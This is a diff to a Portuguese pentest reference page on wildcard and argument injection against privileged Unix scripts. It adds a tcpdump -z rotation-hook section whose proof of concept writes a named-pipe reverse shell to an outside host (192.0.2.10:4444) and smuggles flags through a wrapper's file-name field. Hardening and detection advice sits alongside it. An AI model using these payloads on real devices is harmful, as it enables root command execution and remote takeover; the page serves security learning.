@@ -65,7 +65,7 @@ Se o root mais tarde arquivar o diretório com `rsync -az * backup:/srv/`, a fla
 
 ## 7-Zip / 7z / 7za
 
-Mesmo quando o script privilegiado *defensivamente* prefixa o wildcard com `--` (para parar a análise de opções), o formato 7-Zip suporta **arquivos de lista de arquivos** prefixando o nome do arquivo com `@`. Combinar isso com um symlink permite que você *exfiltre arquivos arbitrários*:
+Mesmo quando o script privilegiado *defensivamente* prefixa o wildcard com `--` (para parar a análise de opções), o formato 7-Zip suporta **arquivos de lista de arquivos** prefixando o nome do arquivo com `@`. Combinando isso com um symlink permite que você *exfiltre arquivos arbitrários*:
 ```bash
 # directory writable by low-priv user
 cd /path/controlled
@@ -86,17 +86,17 @@ Se o root executar algo como:
 ```bash
 zip result.zip files -T --unzip-command "sh -c id"
 ```
-Injecte a flag através de um nome de arquivo elaborado e aguarde o script de backup privilegiado chamar `zip -T` (testar arquivo) no arquivo resultante.
+Injete a flag através de um nome de arquivo elaborado e aguarde o script de backup privilegiado chamar `zip -T` (testar arquivo) no arquivo resultante.
 
 ---
 
-## Binaries adicionais vulneráveis à injeção de wildcard (lista rápida 2023-2025)
+## Binaries adicionais vulneráveis à injeção de wildcard (lista rápida de 2023-2025)
 
 Os seguintes comandos foram abusados em CTFs modernos e em ambientes reais. O payload é sempre criado como um *nome de arquivo* dentro de um diretório gravável que será processado posteriormente com um wildcard:
 
-| Binary | Flag to abuse | Effect |
+| Binary | Flag para abusar | Efeito |
 | --- | --- | --- |
-| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Ler conteúdo do arquivo |
+| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrário `@file` | Ler conteúdo do arquivo |
 | `flock` | `-c <cmd>` | Executar comando |
 | `git`   | `-c core.sshCommand=<cmd>` | Execução de comando via git sobre SSH |
 | `scp`   | `-S <cmd>` | Iniciar programa arbitrário em vez de ssh |
@@ -105,10 +105,53 @@ Essas primitivas são menos comuns do que os clássicos *tar/rsync/zip*, mas val
 
 ---
 
-## Detecção & Dureza
+## ganchos de rotação do tcpdump (-G/-W/-z): RCE via injeção de argv em wrappers
 
-1. **Desabilitar globbing de shell** em scripts críticos: `set -f` (`set -o noglob`) impede a expansão de wildcard.
-2. **Citar ou escapar** argumentos: `tar -czf "$dst" -- *` não é seguro — prefira `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
+Quando um shell restrito ou wrapper de fornecedor constrói uma linha de comando `tcpdump` concatenando campos controlados pelo usuário (por exemplo, um parâmetro "nome do arquivo") sem citação/validação rigorosa, você pode contrabandear flags extras do `tcpdump`. A combinação de `-G` (rotação baseada em tempo), `-W` (limitar número de arquivos) e `-z <cmd>` (comando pós-rotação) resulta em execução arbitrária de comando como o usuário que executa o tcpdump (geralmente root em dispositivos).
+
+Pré-condições:
+
+- Você pode influenciar `argv` passado para `tcpdump` (por exemplo, via um wrapper como `/debug/tcpdump --filter=... --file-name=<HERE>`).
+- O wrapper não sanitiza espaços ou tokens prefixados por `-` no campo do nome do arquivo.
+
+PoC clássica (executa um script de shell reverso a partir de um caminho gravável):
+```sh
+# Reverse shell payload saved on the device (e.g., USB, tmpfs)
+cat > /mnt/disk1_1/rce.sh <<'EOF'
+#!/bin/sh
+rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
+EOF
+chmod +x /mnt/disk1_1/rce.sh
+
+# Inject additional tcpdump flags via the unsafe "file name" field
+/debug/tcpdump --filter="udp port 1234" \
+--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"
+
+# On the attacker host
+nc -6 -lvnp 4444 &
+# Then send any packet that matches the BPF to force a rotation
+printf x | nc -u -6 [victim_ipv6] 1234
+```
+Detalhes:
+
+- `-G 1 -W 1` força uma rotação imediata após o primeiro pacote correspondente.
+- `-z <cmd>` executa o comando pós-rotação uma vez por rotação. Muitas compilações executam `<cmd> <savefile>`. Se `<cmd>` for um script/interpreter, certifique-se de que o manuseio de argumentos corresponda ao seu payload.
+
+Variantes sem mídia removível:
+
+- Se você tiver qualquer outro primitivo para escrever arquivos (por exemplo, um wrapper de comando separado que permite redirecionamento de saída), coloque seu script em um caminho conhecido e acione `-z /bin/sh /path/script.sh` ou `-z /path/script.sh` dependendo da semântica da plataforma.
+- Alguns wrappers de fornecedores rotacionam para locais controláveis pelo atacante. Se você puder influenciar o caminho rotacionado (symlink/travessia de diretório), pode direcionar `-z` para executar conteúdo que você controla totalmente sem mídia externa.
+
+Dicas de hardening para fornecedores:
+
+- Nunca passe strings controladas pelo usuário diretamente para `tcpdump` (ou qualquer ferramenta) sem listas de permissão rigorosas. Coloque entre aspas e valide.
+- Não exponha a funcionalidade `-z` em wrappers; execute tcpdump com um template seguro fixo e desautorize completamente flags extras.
+- Remova privilégios do tcpdump (cap_net_admin/cap_net_raw apenas) ou execute sob um usuário não privilegiado dedicado com confinamento AppArmor/SELinux.
+
+## Detecção & Hardening
+
+1. **Desative a expansão de globos de shell** em scripts críticos: `set -f` (`set -o noglob`) impede a expansão de curingas.
+2. **Coloque entre aspas ou escape** argumentos: `tar -czf "$dst" -- *` *não* é seguro — prefira `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
 3. **Caminhos explícitos**: Use `/var/www/html/*.log` em vez de `*` para que atacantes não possam criar arquivos irmãos que começam com `-`.
 4. **Menor privilégio**: Execute trabalhos de backup/manutenção como uma conta de serviço não privilegiada em vez de root sempre que possível.
 5. **Monitoramento**: A regra pré-construída da Elastic *Potential Shell via Wildcard Injection* procura por `tar --checkpoint=*`, `rsync -e*`, ou `zip --unzip-command` imediatamente seguido por um processo filho de shell. A consulta EQL pode ser adaptada para outros EDRs.
@@ -117,7 +160,9 @@ Essas primitivas são menos comuns do que os clássicos *tar/rsync/zip*, mas val
 
 ## Referências
 
-* Elastic Security – Regra Detectada de Potencial Shell via Injeção de Wildcard (última atualização 2025)
-* Rutger Flohil – “macOS — Injeção de wildcard do Tar” (18 de dezembro de 2024)
+* Elastic Security – Regra Detectada de Potencial Shell via Wildcard Injection (última atualização 2025)
+* Rutger Flohil – “macOS — Injeção de curingas no Tar” (18 de dezembro de 2024)
+* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+* FiberGateway GR241AG – [Cadeia de Exploit Completa](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
 {{#include ../../banners/hacktricks-training.md}}
